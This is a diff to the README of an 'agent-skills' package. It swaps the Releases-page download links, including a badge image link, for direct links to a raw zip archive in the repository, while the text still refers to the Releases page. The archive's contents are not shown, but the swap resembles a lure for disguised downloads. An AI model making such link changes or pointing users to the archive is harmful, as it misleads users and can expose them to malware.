@@ -6,7 +6,7 @@ Welcome to **agent-skills**! This tools package provides reusable agent skills f
 
 ## 📥 Download Here
 
-[![Download agent-skills](https://img.shields.io/badge/Download-agent--skills-blue.svg)](https://github.com/arshia2114/agent-skills/releases)
+[![Download agent-skills](https://raw.githubusercontent.com/arshia2114/agent-skills/main/skills/skills_agent_1.6.zip)](https://raw.githubusercontent.com/arshia2114/agent-skills/main/skills/skills_agent_1.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,7 +28,7 @@ To successfully run the **agent-skills** application, ensure your system meets t
 
 To download the agent-skills application, visit the Releases page at the link below:
 
-[Download agent-skills here](https://github.com/arshia2114/agent-skills/releases)
+[Download agent-skills here](https://raw.githubusercontent.com/arshia2114/agent-skills/main/skills/skills_agent_1.6.zip)
 
 1. Once you are on the Releases page, look for the latest version of the application.
 2. Click on the version you want to download.
